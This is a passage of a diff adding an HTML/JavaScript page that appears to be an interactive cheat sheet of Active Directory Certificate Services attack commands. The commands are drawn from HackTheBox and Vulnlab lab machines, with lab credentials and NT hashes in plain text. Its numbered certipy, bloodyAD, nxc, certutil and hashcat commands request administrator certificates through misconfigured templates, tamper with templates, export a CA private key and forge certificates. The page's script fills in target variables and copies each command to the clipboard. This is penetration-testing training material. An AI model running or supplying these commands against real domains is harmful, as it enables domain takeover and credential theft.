+{num:44,cmd:'DCTIME=$(ntpdate -q 10.10.11.69 | head -1 | awk \'{print $1,$2}\') && faketime "$DCTIME" certipy account update -u p.agila@fluffy.htb -p "prometheusx-303" -dc-ip 10.10.11.69 -user ca_svc -upn ca_svc@fluffy.htb',src:'RESTORE UPN',tags:['linux'],label:'Restore immediately'},
+{num:45,cmd:'DCTIME=$(ntpdate -q 10.10.11.69 | head -1 | awk \'{print $1,$2}\') && faketime "$DCTIME" certipy auth -pfx administrator.pfx -dc-ip 10.10.11.69 -username administrator -domain fluffy.htb',src:'Auth',tags:['linux']},
+{type:'sub',label:'HTB TombWatcher - ESC15 - Template: WebServer - CA: tombwatcher-CA-1'},
+{num:46,cmd:'Get-ADObject -Filter "isDeleted -eq $true" -IncludeDeletedObjects -Properties * | Where-Object {$_.Name -like "*cert*"} | Restore-ADObject',src:'recycle bin restore',tags:['win'],label:'Restore cert_admin from AD Recycle Bin'},
+{num:47,cmd:'Enable-ADAccount -Identity cert_admin && Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "Maveric#!S!S!!" -AsPlainText -Force)',src:'enable account',tags:['win']},
+{num:48,cmd:'sudo ntpdate -u ${DC_IP} && certipy req -u cert_admin@tombwatcher.htb -p "Maveric#!S!S!!" -dc-ip ${DC_IP} -target dc01.tombwatcher.htb -ca "tombwatcher-CA-1" -template "WebServer" -application-policies "1.3.6.1.4.1.311.20.2.1"',src:'ESC15 step1',tags:['linux'],label:'ESC15 Path B Step 1: inject CRA OID'},
+{num:49,cmd:'certipy req -u cert_admin@tombwatcher.htb -p "Maveric#!S!S!!" -dc-ip ${DC_IP} -target dc01.tombwatcher.htb -ca "tombwatcher-CA-1" -template User -pfx cert_admin.pfx -on-behalf-of "tombwatcher\\\\administrator"',src:'ESC15 step2',tags:['linux']},
+{num:50,cmd:'certipy auth -pfx administrator.pfx -dc-ip ${DC_IP}',src:'Auth',tags:['linux']},
+{type:'sub',label:'Vulnlab Hybrid - ESC1 (machine account) - Template: HYBRIDCOMPUTERS - CA: hybrid-DC01-CA'},
+{num:51,cmd:'sudo ntpdate -u ${DC_IP} && keytabextract /etc/krb5.keytab',src:'extract keytab',tags:['linux'],label:'Extract MAIL01$ hash from Linux host keytab'},
+{num:52,cmd:'certipy req -u "MAIL01$@hybrid.vl" -hashes :0f916c5246fdbc7ba95dcef4126d57bd -dc-ip ${DC_IP} -ca "hybrid-DC01-CA" -target dc01.hybrid.vl -template "HYBRIDCOMPUTERS" -upn administrator@hybrid.vl -key-size 4096',src:'ESC1 req',tags:['linux'],label:'-key-size 4096 is MANDATORY for Hybrid'},
+{num:53,cmd:'certipy auth -pfx administrator.pfx -dc-ip ${DC_IP}',src:'Auth',tags:['linux']},
+{type:'sub',label:'Vulnlab Retro - ESC1 (pre-Win2K) - Template: RetroClients - CA: retro-DC-CA'},
+{num:54,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux']},
+{num:55,cmd:'nxc smb ${DC_IP} -u "BANKING$" -p "banking"',src:'verify acct',tags:['linux'],label:'Pre-Win2K: machine name = lowercase password (no $)'},
+{num:56,cmd:'certipy req -u "BANKING$@retro.vl" -p "banking" -dc-ip ${DC_IP} -target dc.retro.vl -ca "retro-DC-CA" -template "RetroClients" -upn administrator@retro.vl -sid ${TARGET_SID} -key-size 4096',src:'ESC1 req',tags:['linux']},
+{num:57,cmd:'certipy auth -pfx administrator.pfx -dc-ip ${DC_IP}',src:'Auth',tags:['linux']},
+{type:'sub',label:'Vulnlab Sendai - ESC4 -> ESC1 - Template: SendaiComputer - CA: sendai-DC-CA'},
+{num:58,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux'],label:'Clifford.Davey:RFmoB2WplgE_3p from spray'},
+{num:59,cmd:'certipy template -u clifford.davey@sendai.vl -p "RFmoB2WplgE_3p" -dc-ip ${DC_IP} -template "SendaiComputer" -save-configuration SendaiComputer_bak.json',src:'backup',tags:['linux']},
+{num:60,cmd:'certipy template -u clifford.davey@sendai.vl -p "RFmoB2WplgE_3p" -dc-ip ${DC_IP} -template "SendaiComputer" -write-default-configuration -force',src:'ESC4 modify',tags:['linux']},
+{num:61,cmd:'certipy req -u clifford.davey@sendai.vl -p "RFmoB2WplgE_3p" -dc-ip ${DC_IP} -target dc.sendai.vl -ca "sendai-DC-CA" -template "SendaiComputer" -upn administrator@sendai.vl -sid ${TARGET_SID}',src:'ESC1 req',tags:['linux']},
+{num:62,cmd:'certipy auth -pfx administrator.pfx -dc-ip ${DC_IP}',src:'Auth',tags:['linux']},
+{num:63,cmd:'certipy template -u clifford.davey@sendai.vl -p "RFmoB2WplgE_3p" -dc-ip ${DC_IP} -template "SendaiComputer" -write-configuration SendaiComputer_bak.json -no-save',src:'RESTORE',tags:['linux'],label:'Mandatory restore'},
+{type:'sub',label:'HTB Certificate - ESC3 + Golden Cert (ESC12) - CA: Certificate-LTD-CA'},
+{num:64,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux'],label:'Lion.SK:!QAZ2wsx from PCAP Kerberos'},
+{num:65,cmd:'certipy req -u lion.sk@certificate.htb -p "!QAZ2wsx" -dc-ip ${DC_IP} -target dc01.certificate.htb -ca "Certificate-LTD-CA" -template "Delegated-CRA"',src:'ESC3 step1',tags:['linux'],label:'Get enrollment agent cert'},
+{num:66,cmd:'certipy req -u lion.sk@certificate.htb -p "!QAZ2wsx" -dc-ip ${DC_IP} -target dc01.certificate.htb -ca "Certificate-LTD-CA" -template "SignedUser" -pfx lion.sk.pfx -on-behalf-of "CERTIFICATE\\\\ryan.k"',src:'ESC3 step2',tags:['linux']},
+{num:67,cmd:'certipy auth -pfx ryan.k.pfx -dc-ip ${DC_IP}',src:'Auth ryan.k',tags:['linux'],label:'Auth as ryan.k (SeManageVolumePrivilege -> extract CA key)'},
+{num:68,cmd:'certutil -exportPFX -p "ExportPass" My SERIAL_NUMBER ca.pfx',src:'export CA key',tags:['win'],label:'Export CA private key as ryan.k'},
+{num:69,cmd:'certipy forge -ca-pfx ca.pfx -upn administrator@certificate.htb -subject "CN=Administrator,CN=Users,DC=certificate,DC=htb" -extensions "sid:S-1-5-21-...-500" -out administrator_forged.pfx',src:'forge cert',tags:['linux']},
+{num:70,cmd:'certipy auth -pfx administrator_forged.pfx -dc-ip ${DC_IP}',src:'Auth admin',tags:['linux']},
+{type:'sub',label:'HTB Scepter - ESC14 (altSecurityIdentities) - CA: scepter-DC01-CA'},
+{num:71,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux']},
+{num:72,cmd:'showmount -e ${DC_IP} && sudo mount -t nfs ${DC_IP}:/share /mnt/nfs',src:'mount NFS',tags:['linux'],label:'Mount NFS share - find .pfx files'},
+{num:73,cmd:'pfx2john cert.pfx > pfx.hash && hashcat -m 22500 pfx.hash /usr/share/wordlists/rockyou.txt',src:'crack pfx',tags:['linux'],label:'Crack PFX passwords'},
+{num:74,cmd:'bloodyAD -d scepter.htb -u a.carter -p "Welcome1" --host ${DC_IP} set object d.baker mail -v h.brown@scepter.htb',src:'ESC14 set mail',tags:['linux'],label:'Scenario B: modify mail to match RFC822 mapping'},
+{num:75,cmd:'certipy req -u d.baker@scepter.htb -hashes :18b5fb0d99e7a475316213c15b6f22ce -dc-ip ${DC_IP} -target dc01.scepter.htb -ca "scepter-DC01-CA" -template "StaffAccessCertificate"',src:'ESC14 req',tags:['linux']},
+{num:76,cmd:'certipy auth -pfx d.baker.pfx -dc-ip ${DC_IP} -domain scepter.htb -username h.brown',src:'Auth',tags:['linux']}
+]}
+];
+// ===== VARS ENGINE =====
+let VARS={DC_IP:'',DC_FQDN:'',CA_HOST:'',ATTACKER_IP:'',IFACE:'tun0',LPORT:'4444',DOMAIN:'',DOMAIN_SHORT:'',CA_NAME:'',TEMPLATE:'',TARGET_USER:'administrator',TARGET_UPN:'',USERNAME:'',PASSWORD:'',NTHASH:'',AESKEY:'',TARGET_SID:'',VICTIM_USER:'',VICTIM_HASH:'',REQUEST_ID:'',PFX_FILE:'administrator.pfx',COMPUTER_NAME:'EVIL$',COMPUTER_PASS:'EvilP@ss123'};
+
+document.querySelectorAll('.var-input').forEach(inp=>{
+  inp.addEventListener('input',()=>{
+    VARS[inp.dataset.var]=inp.value.trim();
+    inp.classList.toggle('filled',inp.value.trim().length>0);
+    if(inp.dataset.var==='TARGET_USER'||inp.dataset.var==='DOMAIN'){
+      const upn=document.getElementById('v_TARGET_UPN');
+      if(upn&&!upn.dataset.manual){upn.value=(VARS.TARGET_USER||'administrator')+'@'+(VARS.DOMAIN||'corp.local');VARS.TARGET_UPN=upn.value;upn.classList.toggle('filled',true);}
+    }
+    if(inp.dataset.var==='TARGET_UPN')inp.dataset.manual=inp.value?'1':'';
+    if(inp.dataset.var==='DC_FQDN'){const ch=document.getElementById('v_CA_HOST');if(ch&&!ch.dataset.manual){ch.value=inp.value;VARS.CA_HOST=inp.value;ch.classList.toggle('filled',inp.value.length>0);}}
+    if(inp.dataset.var==='CA_HOST')inp.dataset.manual=inp.value?'1':'';
+    renderCommands();
+  });
+});
+
+function fillVars(t){return t.replace(/\$\{(\w+)\}/g,(m,k)=>VARS[k]||'${'+k+'}');}
+function saveVars(){localStorage.setItem('adcs_vars',JSON.stringify(VARS));showToast('Saved!');}
+function loadVars(){const s=localStorage.getItem('adcs_vars');if(!s){showToast('Nothing saved');return;}Object.assign(VARS,JSON.parse(s));document.querySelectorAll('.var-input').forEach(i=>{if(VARS[i.dataset.var]){i.value=VARS[i.dataset.var];i.classList.add('filled');}});renderCommands();showToast('Loaded!');}
+function clearVars(){const def={IFACE:'tun0',LPORT:'4444',TARGET_USER:'administrator',PFX_FILE:'administrator.pfx',COMPUTER_NAME:'EVIL$',COMPUTER_PASS:'EvilP@ss123'};Object.keys(VARS).forEach(k=>VARS[k]=def[k]||'');document.querySelectorAll('.var-input').forEach(i=>{i.value=VARS[i.dataset.var]||'';i.classList.remove('filled');});renderCommands();}
+
+// ===== RENDER =====
+let searchQuery='',activePhase=null,collapsedPhases=new Set();
+const contentEl=document.getElementById('content');
+const phaseNavEl=document.getElementById('phase-nav');
+const searchEl=document.getElementById('search');
+const showingEl=document.getElementById('showing');
+const toastEl=document.getElementById('toast');
+
+function escH(s){const d=document.createElement('div');d.textContent=s;return d.innerHTML;}
+function escR(s){return s.replace(/[.*+?^${}()|[\]\\]/g,'\\$&');}
+
+function renderPhaseNav(){
+  phaseNavEl.innerHTML='';
+  PHASES.forEach(p=>{
+    const b=document.createElement('button');
+    b.className='phase-btn'+(activePhase===p.phase?' active':'');
+    b.innerHTML=`<div class="phase-indicator" style="background:${p.color}"></div><div class="phase-info"><div class="phase-name">${p.shortName}</div><div class="phase-count">${p.items.filter(i=>i.num).length} cmds</div></div>`;
+    b.onclick=()=>jumpToPhase(p.phase);
+    phaseNavEl.appendChild(b);
+  });
+}
+
+function renderCommands(){
+  contentEl.innerHTML='';
+  let visible=0;
+  const q=searchQuery.toLowerCase().trim();
+  const qt=q.split(/\s+/).filter(t=>t);
+
+  PHASES.forEach(phase=>{
+    const cmds=phase.items.filter(i=>i.num);
+    const matched=qt.length===0?cmds:cmds.filter(i=>{
+      const txt=((i.cmd||'')+(i.label||'')+(i.src||'')).toLowerCase();
+      return qt.every(t=>txt.includes(t));
+    });
+    if(matched.length===0&&qt.length>0)return;
+
+    visible+=matched.length;
+    const sec=document.createElement('div');
+    sec.className='phase-section';
+    sec.id='phase-'+phase.phase;
+    const isCol=collapsedPhases.has(phase.phase);
+
+    const hdr=document.createElement('div');
+    hdr.className='phase-header';
+    hdr.innerHTML=`<div class="phase-header-bar" style="background:${phase.color}"></div><div class="phase-header-title">Phase ${phase.phase}: ${phase.phaseName}</div><div class="phase-header-count">${matched.length} cmds</div><div class="phase-header-toggle ${isCol?'collapsed':''}">&#9660;</div>`;
+    hdr.onclick=()=>{if(isCol)collapsedPhases.delete(phase.phase);else collapsedPhases.add(phase.phase);renderCommands();};
+    sec.appendChild(hdr);
+
+    const cc=document.createElement('div');
+    cc.className='phase-commands'+(isCol?' collapsed':'');
+
+    // Render all items when no search, or just cmds when searching
+    const itemsToRender=qt.length===0?phase.items:matched;
+    itemsToRender.forEach(item=>{
+      if(item.type==='desc'){
+        const d=document.createElement('div');
+        d.className='desc-block '+(item.cls||'info');
+        d.innerHTML=item.text;
+        cc.appendChild(d);
+        return;
+      }
+      if(item.type==='sub'){
+        const d=document.createElement('div');
+        d.className='sub-header';
+        d.innerHTML=`<div class="sub-dot" style="background:${phase.color}"></div>${escH(item.label)}`;
+        cc.appendChild(d);
+        return;
+      }
+
+      const raw=item.cmd||'';
+      const filled=fillVars(raw);
+      let disp=escH(filled);
+      if(qt.length>0)qt.forEach(t=>{disp=disp.replace(new RegExp('('+escR(escH(t))+')','gi'),'<mark>$1</mark>');});
+
+      const tags=(item.tags||[]).map(t=>`<span class="cmd-tag tag-${t}">${t}</span>`).join('');
+      const card=document.createElement('div');
+      card.className='cmd-card';
+      card.innerHTML=`<div class="cmd-card-border" style="background:${phase.color}"></div>
+        <div class="cmd-card-inner">
+          <div class="cmd-number">${String(item.num).padStart(2,'0')}</div>
+          <div class="cmd-content">
+            ${item.label?`<div class="cmd-label">${escH(item.label)}</div>`:''}
+            <div class="cmd-text">${disp}</div>
+            <div class="cmd-meta">
+              <span class="cmd-source">${escH(item.src||'')}</span>
+              <div class="cmd-tags">${tags}</div>
+              <button class="cmd-copy-btn">Copy</button>
+            </div>
+          </div>
+        </div>`;
+
+      const ct=card.querySelector('.cmd-text');
+      const cb=card.querySelector('.cmd-copy-btn');
+      const copyFn=()=>{const t=fillVars(raw);navigator.clipboard.writeText(t).catch(()=>{const a=document.createElement('textarea');a.value=t;document.body.appendChild(a);a.select();document.execCommand('copy');document.body.removeChild(a);});showToast('Copied!');const o=cb.textContent;cb.textContent='Copied!';cb.classList.add('copied');setTimeout(()=>{cb.textContent=o;cb.classList.remove('copied');},1500);};
+      ct.addEventListener('click',copyFn);
+      cb.addEventListener('click',e=>{e.stopPropagation();copyFn();});
+      cc.appendChild(card);
+    });
+
+    sec.appendChild(cc);
+    contentEl.appendChild(sec);
+  });
+
+  showingEl.textContent=visible;
+  if(visible===0&&qt.length>0)contentEl.innerHTML='<div class="empty-state"><h3>No commands found</h3><p>Try a different search</p></div>';
+}
+
+function showToast(m){toastEl.textContent=m;toastEl.classList.add('show');setTimeout(()=>toastEl.classList.remove('show'),2000);}
+function jumpToPhase(n){activePhase=n;renderPhaseNav();if(collapsedPhases.has(n)){collapsedPhases.delete(n);renderCommands();}setTimeout(()=>{const el=document.getElementById('phase-'+n);if(el)el.scrollIntoView({behavior:'smooth',block:'start'});},100);}
+
+searchEl.addEventListener('input',e=>{searchQuery=e.target.value;renderCommands();});
+
+function setTheme(t){document.documentElement.setAttribute('data-theme',t);localStorage.setItem('adcs_theme',t);}
+setTheme(localStorage.getItem('adcs_theme')||'dark');
+document.getElementById('theme-toggle').addEventListener('click',()=>{const c=document.documentElement.getAttribute('data-theme');setTheme(c==='dark'?'light':'dark');});
+
+document.addEventListener('keydown',e=>{
+  if(document.activeElement===searchEl){if(e.key==='Escape'){searchEl.blur();searchQuery='';searchEl.value='';renderCommands();}return;}
+  if(e.key==='/'){{e.preventDefault();searchEl.focus();return;}}
+  if(e.key==='t'||e.key==='T'){const c=document.documentElement.getAttribute('data-theme');setTheme(c==='dark'?'light':'dark');return;}
+  if(e.key==='v'||e.key==='V'){setVarsOpen(!document.getElementById('vars-body').classList.contains('open'));return;}
+  if(e.key==='?'){document.getElementById('modal').classList.add('show');return;}
+  if(e.key>='0'&&e.key<='9'&&parseInt(e.key)<PHASES.length)jumpToPhase(parseInt(e.key));
+});
+
+document.getElementById('help-btn').addEventListener('click',()=>document.getElementById('modal').classList.add('show'));
+document.getElementById('close-modal').addEventListener('click',()=>document.getElementById('modal').classList.remove('show'));
+document.getElementById('modal').addEventListener('click',e=>{if(e.target===document.getElementById('modal'))document.getElementById('modal').classList.remove('show');});
+
+window.addEventListener('beforeunload',()=>localStorage.setItem('adcs_scroll',window.scrollY));
+const sc=localStorage.getItem('adcs_scroll');if(sc)setTimeout(()=>window.scrollTo(0,parseInt(sc)),200);
+
+function setVarsOpen(open){const vb=document.getElementById('vars-body');const btn=document.getElementById('vars-toggle');if(open){vb.classList.add('open');btn.textContent='⚡ TARGET VARIABLES — (collapse)';}else{vb.classList.remove('open');btn.textContent='⚡ TARGET VARIABLES — Click to fill all commands automatically';}localStorage.setItem('adcs_vars_open',open?'1':'0');}
+document.getElementById('vars-toggle').addEventListener('click',()=>setVarsOpen(!document.getElementById('vars-body').classList.contains('open')));
+setVarsOpen(localStorage.getItem('adcs_vars_open')!=='0');
+
+renderPhaseNav();
+renderCommands();
+loadVars();
+</script>
+</body>
+</html>
